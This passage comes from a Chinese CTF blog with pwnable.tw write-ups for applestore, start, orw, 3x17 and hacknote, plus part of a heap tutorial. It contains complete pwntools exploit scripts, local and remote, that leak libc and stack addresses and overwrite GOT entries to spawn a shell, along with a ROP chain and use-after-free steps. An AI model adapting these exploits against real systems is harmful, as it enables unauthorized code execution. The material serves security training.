*\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nlog.warn('libc_addr:0x%x' % libc_addr)\nlog.warn('heap_addr:0x%x' % heap_addr)\nlog.warn('satck_addr:0x%x' % stack_addr)\nlog.warn('ebp_addr:0x%x' % ebp_addr)\n\ngdb.attach(myps,'b * 0x080489C0 \\nc \\np $ebp')\nmysend(delete,'3')\n\nmyps.interactive()\n```\n\n如下图，发现ebp地址对得上，说明delete函数中的ebp确实跟之前函数的ebp是一致的：\n\n```shell\n[!] libc_addr:0xf7d5f000\n[!] heap_addr:0x8c89000\n[!] satck_addr:0xffa9f2d8\n[!] ebp_addr:0xffa9f2f8\n=========================================================\n[#0] 0x80489c0 → delete()\n[#1] 0x8048c46 → handler()\n[#2] 0x8048cf5 → main()\n──────────────────────────────────────────────────────\n$1 = (void *) 0xffa9f2f8\ngef➤  \n```\n\n### 2.2.2 劫持ebp到got表\n\n泄露完ebp地址后，就可以利用delete函数去更改栈空间中存放的old ebp，从而使函数退出时，实现ebp劫持。\n\n劫持到哪儿呢？当然是got表啦！通过IDA查看该二进制程序中got表的地址是0x0804B000至0x0804B040，因此got表底部为0x0804B044。\n\n将ebp劫持到got表底部的验证代码如下：\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\ngdb.attach(myps,'b * 0x08048A6F \\nc \\np $ebp')\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(0x0804B044)\nmysend(delete,payload)\n\nmyps.interactive()\n```\n\n在gdb窗口中，验证old ebp确实被替换成了我们想要的0x0804B044（got表尾地址）。\n\n```shell\ngef➤  p $ebp\n$1 = (void *) 0xffba66e8\ngef➤  p $esp\n$2 = (void *) 0xffba66a0\ngef➤  x/20wx 0xffba66e8\n0xffba66e8:\t0x0804b044\t0x08048c46\t0xffba6706\t0x00000015\n0xffba66f8:\t0xffba6718\t0xf7e26020\t0x00000003\t0x0a333918\n0xffba6708:\t0xf7e26000\t0x080486f7\t0x08048e23\t0x00000006\n0xffba6718:\t0xffba6774\t0x87bfaa00\t0xf7f8edbc\t0xf7f001e5\n0xffba6728:\t0xffba6748\t0x08048cf5\t0x0804b068\t0x00000000\ngef➤  x/20wx 0xffba66a0\n0xffba66a0:\t0x08048f98\t0x00000004\t0x0804b028\t0x00000000\n0xffba66b0:\t0x00000004\t0xffba66c8\t0x00000004\t0xffba66dc\n0xffba66c0:\t0x0804b044\t0x00346706\t0x0804b028\t0x00000001\n0xffba66d0:\t0xffba66dc\t0x0804b044\t0x0000000a\t0x87bfaa00\n0xffba66e0:\t0xf7f8d000\t0xf7f8d000\t0x0804b044\t0x08048c46\n```\n\n### 2.2.3 劫持ebp并覆写got表\n\n上述将ebp劫持到got表尾后，程序回到了handler中，函数如下。可以看到which_phone变量在ebp-0x22处（此时ebp-0x22正好在got表中），因此我们可以通过which_phone的输入去更改got表中的内容。\n\n如果我们能把atoi改成system，并且把which_phone的内容改成\"sh\"，那么就能在atoi(&which_phone)时获得shell。\n\n```c\nunsigned int handler()\n{\n  char which_phone; // [esp+16h] [ebp-22h]\n  unsigned int v2; // [esp+2Ch] [ebp-Ch]\n\n  v2 = __readgsdword(0x14u);\n  while ( 1 )\n  {\n    printf(\"> \");\n    fflush(stdout);\n    my_read(&which_phone, 0x15u);\n    switch ( atoi(&which_phone) )\n    { ······\n```\n\ngot表最后几项内容：\n\n```assembly\n.got.plt:0804B030 9C B0 04 08                   off_804B030     dd offset exit          ; DATA XREF: _exit↑r\n.got.plt:0804B034 A0 B0 04 08                   off_804B034     dd offset __libc_start_main\n.got.plt:0804B034                                                                       ; DATA XREF: ___libc_start_main↑r\n.got.plt:0804B038 A4 B0 04 08                   off_804B038     dd offset memset        ; DATA XREF: _memset↑r\n.got.plt:0804B03C A8 B0 04 08                   off_804B03C     dd offset asprintf      ; DATA XREF: _asprintf↑r\n.got.plt:0804B040 AC B0 04 08                   off_804B040     dd offset atoi          ; DATA XREF: _atoi↑r\n.got.plt:0804B040                               _got_plt        ends\n.got.plt:0804B040\n.data:0804B044                               ; =======================================================\n```\n\natoi函数是got表中最后一项，它的上一项是asprintf。,令asprintf的地址为ebp-0x22，则构造which_phone为\"sh\\x00\\x00\" + (mylibc.symbols['system'] + libc_addr)，就可以将asprintf和atoi表项分别覆盖为\"sh\\x00\\x00\"和\"system函数\"。因此当执行switch括号中的atoi(&which_phone)时，相当于执行了system(\"sh\")。\n\n跟2.2.2中劫持ebp到got表的位置不同，这里需将ebp劫持到myelf.got['asprintf']+0x22，才能使其满足上述条件。\n\n因此payload为：\n\n```python\npayload = \"2\\x00\" + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr - 0xc) + p32(myelf.got['asprintf']+0x22)\n```\n\n# 3 EXP\n\n## 3.1 本地\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('/lib32/libc-2.23.so')\nmyps = process(myelf.path)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n## 3.2 远程\n\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\n\nmyelf = ELF('applestore')\nmylibc = ELF('../libc_32.so.6')\nmyps = remote('chall.pwnable.tw',10104)\n\nadd = '2'\ndelete = '3'\ncart = '4'\ncheckout = '5'\n\ndef mysend(op,payload):\n    myps.sendlineafter('> ',op)\n    myps.sendlineafter('> ',payload)\n\nfor i in range(6):\n    mysend(add,'1')\nfor i in range(20):\n    mysend(add,'2')\nmysend(checkout,'y')\n\npayload = 'y\\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nlibc_addr = u32(myps.recv(4))-mylibc.symbols['puts']\nmyps.recvuntil('28: ')\nheap_addr = u32(myps.recv(4)) - 0x490\n\npayload = 'y\\x00' + p32(heap_addr + 0x8b0) + p32(1) + p32(0x0804B070) + p32(1)\nmysend(cart,payload)\n\nmyps.recvuntil('27: ')\nstack_addr = u32(myps.recv(4))\nebp_addr = stack_addr + 0x20\n\nfor i in range (23):\n    mysend(delete,'1')\n\npayload = '4\\x00' + p32(myelf.got['puts']) + p32(1) + p32(ebp_addr-0xc) + p32(myelf.got['asprintf']+0x22)\nmysend(delete,payload)\n\nwhich_phone = \"sh\\x00\\x00\" + p32(mylibc.symbols['system'] + libc_addr)\nmyps.sendlineafter('> ',which_phone)\nmyps.interactive()\n```\n\n# 4 reference\n\n[C语言alarm()函数：设置信号传送闹钟](http://c.biancheng.net/cpp/html/334.html)\n\n[asprintf](https://blog.csdn.net/yuan08shandong/article/details/50580834)\n","tags":["heap"],"categories":["CTF"]},{"title":"pwnable.tw之start-ORW-3x17","url":"/2020/03/04/startORW317/","content":"\n这里把pwnable.tw上前面的几个题放在一起写篇博客，分别是：\n\n- start\n- orw\n- 3x17\n\n# 1 start\n\n## 1.1 题目\n\nhttps://pwnable.tw/challenge/#1\n\n## 1.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](start1.png)\n\n运行起来试试：\n\n![](start2.png)\n\nIDA查看二进制文件start：\n\n![](start3.png)\n\n![](start4.png)\n\n发现除了_start和_exit没有熟悉的main函数，使用IDA查看伪代码也不是一个正常的函数，原因在于这是一个纯汇编代码。\n\n因此我们需要看懂这段汇编都做了些什么：\n\n1    压了_exit函数的地址\n\n2    清eax,ebx,ecx,edx\n\n3    压字符串，20个字节\n\n4    分别给eax,ebx,ecx,edx赋值(4,1,esp,20),然后int 80h系统调用\n\n5    清ebx,给eax,edx赋值（3，60），然后int 80h系统调用\n\n6    esp加20个字节收回栈空间\n\n7    根据栈上的返回地址（_exit）返回\n\n可以看到有两次系统调用（eax是系统调用号，然后ebx，ecx，edx，esx，edi分别放置系统调用的参数）。查表可知4对应的系统调用是write，3对应的是read。\n\n因此以上4和5可以翻译成：\n\n```c\nwrite(1,esp,20); // 从栈上读20个字节到标准输出（读内存）\nread(0,esp,60);  // 从标准输入写60个字节到栈上（写内存）\n```\n\n很明显是个栈溢出，read的60个字节会覆盖到返回地址exit。\n\n![](start5.png)\n\n## 1.3 利用\n\nexit被覆盖后，就控制了eip，此时应该让eip指向哪儿才能get shell呢？当然是指向我们构造的一段shellcode，shellcode应该放哪儿呢？如果放在栈上，但此时我们并不知道栈的地址，那么能不能泄露栈地址呢？再看一下汇编代码：\n\n![](start6.png)\n\n第一次执行完retn之后，esp指向下图位置：\n\n![](start7.png)\n\n如果此时从08048070处开始执行，就可以将old esp的值打印出来，old esp = esp+4。并且可以继续从此esp指向的位置写0x3C字节，如下图所示，esp往上是第二次的输入，我们可以好好构造这次输入，让下次执行retn时，再一次劫持eip（即ret addr），将ret addr覆盖为shellcode addr即可。\n\n![](start8.png)\n\n现在重新理一下，oldesp是write系统调用时泄露出来的，因此shellcode addr是old esp+0x14。那么现在需要找一段合适的shellcode来get shell。\n\n在http://shell-storm.org/shellcode/找到一段长度合适的shellcode如下：\n\n![](start9.png)\n\n![](start10.png)\n\nexp如下：\n\n![](start11.png)\n\n执行结果如下：\n\n![](start12.png)\n\n![](start13.png)\n\n## 1.4 记录\n\n### 1.4.1 pwntools的使用\n\nhttps://pwntools.readthedocs.io/en/stable/about.html\n\nhttp://brieflyx.me/2015/python-module/pwntools-intro/\n\npwntools的cyclic：\n\nhttps://www.cnblogs.com/liuyimin/p/7379985.html\n\n### 1.4.2 gdb-peda的使用\n\n[https://introspelliam.github.io/2017/08/03/pwn/gdb%E7%9A%84%E8%B0%83%E8%AF%95%E4%B8%8E%E4%BD%BF%E7%94%A8/](https://introspelliam.github.io/2017/08/03/pwn/gdb的调试与使用/)\n\npwntools + gdb：\n\nhttp://docs.pwntools.com/en/stable/gdb.html?highlight=gdb#module-pwnlib.gdb\n\n### 1.4.3 shellcode database\n\nhttp://shell-storm.org/shellcode/\n\n# 2 orw\n\n## 2.1 题目\n\nhttps://pwnable.tw/challenge/#2\n\n## 2.2 分析\n\n首先，查看文件属性和开启的保护措施：\n\n![](orw1.png)\n\n运行起来试试：\n\n![](/orw2.png)\n\nIDA查看二进制文件orw：\n\n![](orw3.png)\n\n伪代码如下：\n\n![](orw4.png)\n\n【orw_seccomp()是一个设置函数，这里的作用是设置只能使用open，read，write三个系统调用。具体原理参考2.4.2中。】\n\nread从标准输入读取数据放到shellcode地址处，然后转到shellcode处去执行代码。\n\nshellcode地址如下：\n\n![](orw5.png)\n\nview, open subviews, segments查看bss段属性：\n\n![](orw6.png)\n\n【这里显示不可执行，但checksec中RWX属性为has RWX segments且实际shellcode放到bss段中后可执行，这里目前还不知道是为什么？？？】\n\n## 2.3 利用\n\n题目只允许使用open，read，write三个系统调用函数，因此通过这三个函数实现打开/home/orw/flag文件，将其读到bss段或者栈中，然后再将bss或栈中的数据写到标准输出（即屏幕上）打印。\n\n![](orw7.png)\n![](orw8.png)\n\npayload对应的汇编代码：\n\n![](orw9.png)\n\n执行得到flag：\n\n![](orw10.png)\n![](orw11.png)\n\n## 2.4 记录\n\n### 2.4.1 64位ubuntu安装32位库\n\nubuntu 64位版本，安装支持32位程序的二进制库。\n\nsudo dpkg --add-architecture i386\n\nsudo apt-get update\n\nsudo apt-get install zlib1g:i386 libstdc++6:i386 libc6:i386\n\n### 2.4.2 seccomp和prctl\n\n[https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/](https://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/)\n\nhttps://www.jianshu.com/p/62ede45cfb2e\n\nhttps://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\n\n### 2.4.3 pwnlib.shellcraft.i386\n\n这次题目中只用到了两个重要的函数。\n\n第一个是将字符串push到栈中，此时esp指向的就是这段字符串。\n\n`pwnlib.shellcraft.i386.pushstr(string, append_null=True)`\n\n```python\n>>>print shellcraft.i386.pushstr('aaaa').rstrip()\n  /* push 'aaaa\\x00' */\n  push 1\n  dec byte ptr [esp]\n  push 0x61616161\n```\n\n第二个是系统调用，syscall是要调用的函数（eax存放系统调用号），后面紧接着的是各个参数（ebx，ecx，edx等）（参数可以是某个寄存器，如’esp’）。\n\n`pwnlib.shellcraft.i386.linux.syscall(syscall=None, arg0=None, arg1=None, arg2=None, arg3=None, arg4=None, arg5=None)`\n\n```python\n>>> print pwnlib.shellcraft.i386.linux.syscall('SYS_execve', 1, 'esp', 2, 0).rstrip()\n    /* call execve(1, 'esp', 2, 0) */\n    push SYS_execve /* 0xb */\n    pop eax\n    push 1\n    pop ebx\n    mov ecx, esp\n    push 2\n    pop edx\n    xor esi, esi\n    int 0x80\n```\n\n参考别人的writeup，发现简洁写法（因为提前用context设置了目标环境）：\n\n![](orw12.png)\n\n# 3 3x17\n\n## 3.1 题目\n\nhttps://pwnable.tw/challenge/#32\n\n## 3.2 分析\n\n查看文件类型和开启的保护机制：\n\n![](3171.png)\n\n是去了符号表的，且静态链接。因此IDA的F5基本上没用了，只能纯看汇编。先执行看看：\n\n![](3172.png)\n\n属于addr和data，这里猜测会是将data写到addr上。 后续查看汇编代码，确实是这样。\n\nIDA打开二进制文件，只有start函数：\n\n![](3173.png)\n\n不知道以上各地址和寄存器的值代表什么内容，因此自己写了个printf(“hello world!\\n”)的小程序，使用IDA打开，找到start对应的汇编，如下：\n\n![](/3174.png)\n\n因此3x17的start可解析为下图：\n\n![](3175.png)\n\n64位汇编参数传递规则如下：\n\n![](3176.png)\n\n因此\n\n__libc_start_main(mian[sub_401B6D], argc, ubp_av, init [loc_4028D0], fini[sub_402960], rtld_fini)\n\nmain函数代码如下：\n\n![](3177.png)\n\nsub_40EE70具体做了什么，看汇编代码太复杂，因此通过gdb调试看结果，使用gdb在401BED处下断点。\n\n![](3178.png)\n\n断点处信息如下：\n\n![](3179.png)\n\n执行完该函数之后，返回值会存放在RAX中。刚刚输入的是12345，返回值为0x3039，即12345的十六进制，因此该函数就是将输入的十进制数转换为一个十六进制地址。\n\n![](31710.png)\n\ninit是执行main函数之前会执行的，而fini是main执行完后执行的函数。\n\n因此考虑用任意地址写去覆盖fini的执行流程。如下是fini的汇编代码，在4B40F0处分别调用两个函数，且调用顺序是先fini_array[1]后fini_array[0]。那么只要将数组中的地址覆盖为我们想要的地址，就可以控制程序去执行了。\n\n![](31711.png)\n\n![](31712.png)\n\n## 3.3 利用\n\n获得以上信息之后，我们需要考虑，应当让fini_array的两个函数地址分别被覆盖为什么，才能达到利用的目的。利用就是get shell。在程序中使用strings搜索“/bin/sh”无果，因此一步完成get shell是不可能的，需要寻找其他方法。\n\nmain函数中可以实现任意地址写，如果将fini_array[1]的地址指向main，那么似乎就可以继续任意地址写。查看main函数，发现byte_4B9330为1时才能进入任意地址写操作，而我们第二次进入该函数时byte_4B9330已经为2了。怎么办呢？但是看看前面的int8，这是一个8位无符号整形，因此不用加多久，就整数溢出又变成1了。\n\n![](31713.png)\n\n那么怎么让main一直被调用呢？剩下的fini_array[0]就派上用场了。\n\n![](31714.png)\n![](31715.png)\n\n把fini_array[1]和fini_array[0]分别覆盖为main和调用array的fini函数，就可以实现如下循环。\n\n![](31716.png)\n\n这样就可以不限次数的任意地址写了。但是往哪里写，写什么内容呢？因为没有可写可执行段，因此直接把shellcode布置到内存空间中跳转执行是不可能的。那么就只能考虑ROP了，但不知道栈的位置，也没法去布置栈空间实现ROP。不过RIP是我们可以控制的，因此只要存在某一刻rsp会被泄露出来，那么只要在这一刻之前把对应地址空间布置好，那么就可以不断地ret然后把ROP链串起来啦。\n\n回到fini函数中，rbp原本的值被暂时存放在栈中，这里以rbp做临时寄存器，存放了fini_array的起始地址，此时rbp=0x4B40F0。\n\n![](31717.png)\n\n如果call指令能跳转到leave; ret; 这样的指令去，那么就可以控制rsp的地址了。如下是main函数中一条合适的指令：\n\n![](31718.png)\n\n```assembly\nrbp = 0x4B40F0\n\nleave:\nmov rsp,rbp          rsp = 0x4B40F0, rbp = 0x4B40F0\npop rbp                 rsp = 0x4B40F8, rbp = fini_array[0]\n\nret:\npop rip                  rsp = 0x4B4100, rip = fini_array[1]\n```\n\n这里必须让fini_array[1]为main，fini_array[0]为0x401C4B。这样rip被控制再去执行一次main函数，利用最后的ret，使rip从0x4B4100处执行，这里是我们提前布置好的空间。\n\n那么接下来的工作就是怎么布置0x4B4100以上的空间，通过ROP的方式获取shell。\n\n一条简单的获取shell的命令：\n\n![](31719.png)\n\n32位系统上通过int 80进行系统调用，64位系统上通过syscall指令实现。根据以上代码，需要控制rax为59（execve的系统调用号，0x3B），rdi为字符串“/bin/sh\\x00”的地址，rsi为0，rdx为0。因此rsp指向位置的ROP链应如此布置：\n\n```assembly\npop_rax\n0x3B\npop rdi\naddr_of_bin_sh\npop rsi\n0\npop rdx\n0\nsyscall\n```\n\n最后，字符串“/bin/sh\\x00”随便找一块可写的空间写上去就行。\n\n寻找gadget：\n\n![](31720.png)\n\n![](31721.png)\n\n![](31722.png)\n\n![](31723.png)\n\n![](31724.png)\n\n写exp：\n\n![](31725.png)\n\n执行获得flag：\n\n![](31726.png)\n\n## 3.4 记录\n\n### 3.4.1 64位汇编参数传递\n\nhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stack-intro-zh/\n\n\n\n\n","categories":["CTF"]},{"title":"pwnable.tw之hacknote","url":"/2020/03/01/hacknote/","content":"\n# 1 题目\n\n[题目链接](https://pwnable.tw/challenge/#5)\n\n![](hacknote-1.png)\n\n提供了一个二进制文件hacknote和一个库libc.so。\n\n# 2 分析\n\n首先分析一下这个题目的可执行程序。这是一个32bit的可执行程序，动态链接且去了符号表。该二进制程序符号表可读可写，开启了栈不可执行和canary保护，没有开启地址随机化。\n![](hacknote-2.png)\n执行以下试试。如下图，该程序提供了几个功能，添加/删除/打印笔记。我们用IDA看看这些功能的实现。\n![](hacknote-3.png)\n（1）add note功能\n![](hacknote-4.png)\nAdd操作只能执行5次。Sub_804862B函数如下，将a1+4这个地址处的指针取出，然后利用puts将该指针指向的内容进行打印。\n![](hacknote-5.png)\nChunk1和chunk2的关系如下图所示：\n![](hacknote-6.png)\n（2）delete note功能（这里存在漏洞点）\n![](hacknote-7.png)\n可以看到，delete函数将chunk2和chunk1释放掉后，并没有将指向各chunk的指针ptr[v1]置NULL，导致了悬空指针的产生。\n\n（3）print note功能\n![](hacknote-8.png)\n\n# 3 利用\n\n> 利用主要从两个方面去考虑（以第2节中chunk1和chunk2的图为例）：\n> 1、puts的内容就是chunk2中的内容，因此考虑将chunk2中的内容覆盖为我们想要的东西。如libc中某个函数的地址，这样我们就可以计算得到libc的基址，从而知道任意一个libc函数在动态执行时的地址。\n> 2、chunk1的的内容部分，前四个字节是一个函数指针，如果我们能控制这个chunk的前四个字节，就可以实现任意地址执行，劫持EIP。然而chunk1的内容并非我们能轻易改动的，因此需要结合glibc的堆管理机制中存在的漏洞，使chunk1的内容变得可控，且依然满足原来可执行的特性。从这里可以看出，我们需要两个不同的对象操作同一块内容，本质就是UAF。\n\n## 3.1 获取libc基址\n\n### 3.1.1 本地调试时libc的基址\n本地调试时，可以在gdb中方便地获取到libc的基址，为0xf7e07000。\n![](hacknote-9.png)\n### 3.1.2 本地动态调试，获取libc中main_arena结构体中top的地址\n**Unsorted bin有一个特性，就是链表中第一个chunk的fd和bk均指向main_arena结构体中的top位置。因此只要我们泄露出这个地址，加上题目提供的libc，就可以轻松计算出libc在实际场景中的基址了。**\n\n首先add一个64字节的note，再add一个10字节的note，然后delete掉第一个note。此举的目的是使第一个note中大于fastbin的堆块不被top chunk给合并掉，从而该堆块可以进入unsorted bin。\n![](hacknote-10.png)\n再次申请64字节的空间，堆管理器会把unsorted bin中的chunk再次分配给我们，此时index 2和index 0指向同一块堆内存区域。此时输入的内容只要不覆盖到unsorted bin中那个chunk的bk位置，就可以在成功分配后，调用print打该内存区域，获得main_arena中top的地址（地址是不可显示字符，所以显示乱码）。\n![](hacknote-11.png)\n![](/hacknote-12.png)\n![](hacknote-13.png)\n### 3.1.3 远端的libc中top相对libc基址的偏移\n\nLibc库中的Malloc_trim函数中存在main_arena结构体，如下图位置：\n![](hacknote-14.png)\n查看main_arena在libc库中的偏移为0x001B0780。按照main_arena结构体与unsorted bin的关系（如下图），可知第一个被归档到unsorted bin的chunk，其fd与bk应当指向0x001B0780+0x30=0x001B07B0。\n![](hacknote-15.png)\n因此unsorted bin中返回的值，与libc基址的偏移为0x001B07B0。\n\n那么libc_base = addr(dongtai_top) – 0x001B07B0，因此只需要用3.1.2中的方法将top的地址泄露出来，就可以计算出libc的基址啦。\n\n## 3.2 劫持EIP\n>思路：申请note时会建立chunk1（8byte）和chunk2（跟chunk1不同的大小就行），若再申请一个note，此时又会建立chunk1`和chunk2`。将这两个note删除后，chunk1和chunk1`会被链到同一大小（8byte）的fastbin上，chunk2和chunk2`会被链到其他大小的fastbin上。如果此时再申请一个8byte的note，就会将chunk1`和chunk1分别作为puts函数堆和内容堆。这个时候，chunk1被index 0和index2同时锁定。我们通过index 2 更改chunk1中的内容，然后通过index 0 去执行被替换掉的函数指针。\n\n具体操作如下：\n\n先申请两个大小为30的note，然后删除掉这两个note\n![](hacknote-16.png)\n再add一个大小为8的note，此时会将fastbin上大小为8的chunk进行分配。如下图，从上往下，第一个chunk已经被写入555了。\n![](hacknote-17.png)\n此时print 2得到如下结果。print 0 会报段错误，eip被覆盖成了555（即最后申请大小为8的堆时输入的content）。说明我们可以通过这种方式控制eip指针。\n![](hacknote-18.png)\n![](hacknote-19.png)\n\nEXP如下：\n```python\nfrom pwn import *\ncontext(arch='i386',os='linux',log_level='debug')\nmyelf = ELF('./hacknote')\nmylibc = ELF('./libc_32.so.6')\nio = remote('chall.pwnable.tw',10102)\n\ndef add_note(size,content):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"1\")\n    io.recvuntil(\"size :\")\n    io.sendline(str(size))\n    io.recvuntil(\"Content :\")\n    io.sendline(content)\n\ndef del_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"2\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\ndef print_note(index):\n    io.recvuntil(\"choice :\")\n    io.sendline(\"3\")\n    io.recvuntil(\"Index :\")\n    io.sendline(str(index))\n\n\nadd_note(64,\"12\")\nadd_note(32,\"12\")\ndel_note(0)\nadd_note(64,\"45\")\nprint_note(2)\n\nlibc_addr = u32(io.recv(8)[4:8]) - 0x1b07b0\nsys_addr = libc_addr + mylibc.symbols['system']\n\n# add_note(8,\"12\")\n# add_note(8,\"34\")\n# del_note(3)\n# del_note(4)\ndel_note(0)\ndel_note(1)\nadd_note(8,p32(sys_addr)+\";sh\\x00\")\nprint_note(0)\nio.interactive()\n\n```\n\n# 4 记录\n\n## unsorted bin attack\n\nhttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/\n\n\n","tags":["heap","unsortedbin"],"categories":["CTF"]},{"title":"ctf堆入门 - paper","url":"/2020/02/23/paper/","content":"\n[题目文件链接](https://xuanxuanblingbling.github.io/assets/pwn/paper)\n\n# 1、寻找漏洞点\n\n拿到ELF后，先看看它的一些信息。\n- File查看文件格式\n- Checksec查看开启的安全编译选项\n- 运行一下看看都有哪些功能\n- 使用IDA看看伪代码，理解整个二进制程序的功并查找漏洞点。\n\n![](paper-1.png)\n\n64位程序，动态链接，没有去符号表，got表可写可读，开启栈不可执行和canary保护，没有做地址随机化。\n\n![](paper-2.png)\n\n程序提供两个功能，增加paper和删除paper，paper中可以存放指定大小的数据。\n\n![](paper-3.png)\n\nIDA查看程序实现，关注add_paper和delete_paper。\n\n![](paper-4.png)\n\nAdd paper中申请一块堆，然后存放数据。这个函数实现各项检查都做得很好，没发现漏洞点。\n\n![](paper-5.png)\n\nDelete paper中free掉指向堆的`link_list[index]`指针后，没有将该指针置NULL。导致一个悬空指针的产生《对几类危险的指针，见本文的记录——三类漏洞指针》。\n\n# 2、利用分析\n\n堆管理机制中，对于较小的堆块，采用fastbin的方式进行回收（本题中要求堆块小于0x80，这样free操作之后，该chunk会被链接到fastbin上）。本题中，申请的最大堆内存为1024Byte，所以要控制申请的堆大小不超过0x80。\n\n根据fastbin的单向链表及其他特性《见记录——fastbin attack》，我们需要通过double free在fastbin的链表中构造一个环（如下图）。然后申请一个与chunk1、chunk2相同大小的堆，此时会返回chunk1给线程使用，于是可以更改chunk1中的数据（如将“fd”位置处的值改为我们的目标地址）。下一次malloc时分配chunk2，再下一次分配时依然是chunk1，但此时main_arena已经指向目标地址处（如果目标地址合理）了。此时再malloc一次，就可以实现对该地址空间写任意值了。\n\n![](paper-6.png)\n\n这样接下来的目标就是，往哪里写才能getshell呢？\n\n要getshell就必须控制指针的执行流，使其执行我们构造的提权函数或者直接去执行该二进制文件中已有的提权函数。\n\n（1）寻找或构造提权函数（这里以ELF中自带提权函数为例）\n\n回到ELF文件，搜索“/bin/sh”或system函数，看是否存在这种后门，使利用更加简单。在string窗口中搜索“/bin/sh”，查看其引用gg，发现gg中会调用system(“/bin/sh”)。\n\n![](paper-7.png)\n\n![](paper-8.png)\n\n![](paper-9.png)\n\n至此，我们的提权函数就找到了！那么怎样才能让程序流乖乖地来执行我们的提权函数呢？\n\n（2）替换函数内容或替换函数指针（这里以替换函数指针为例）\n\t\n控制执行流的做法通常是将原本要执行的函数进行替换，替换函数指针或者替换掉函数内容。\n\n这里我们已经有了一个提权函数gg，且ELF并未开启地址随机化，那么首先想到的是控制某个函数指针指向gg。也就是说要把gg函数的地址0x00400943写到某个会被当做“函数指针”的地址0x12345678上去，这样当原本程序流从该0x12345678上取值并跳转执行时，就会执行gg函数了。\n\n![](paper-10.png)\n\n往哪里写这个gg函数地址呢？回到ELF文件，逆向查看伪源码，源码中并未定义有用的函数指针，但是栈上的返回地址可以作为考虑的一个选项。另外一种方法，就是去覆写got表了，具体做法是更改该got表的某个表项内地址为gg函数地址。这样当程序执行到该got表中函数（如printf、puts、gets等等）时，便会去执行我们的提权函数啦。\n\n那么最后，怎么获取到got表的地址以及该got条目的地址呢？由于本题的ELF未开启地址随机化，所以可直接通过IDA查看got表的起始地址以及各表项的具体地址。然而，对于开启随机化的ELF，就需要我们想办法去泄露got表地址了，这个方法在这篇文章中不予讨论。\n\n可以看到该ELF的got表条目如下，got表地址为0x00602000。\n\n![](paper-11.png)\n\n到这里利用思路基本明确了，就是将chunk1中fd的地址替换成got表中某一项（会执行到的函数）的值，然后将该项的值改成gg函数地址。\n\n那么这个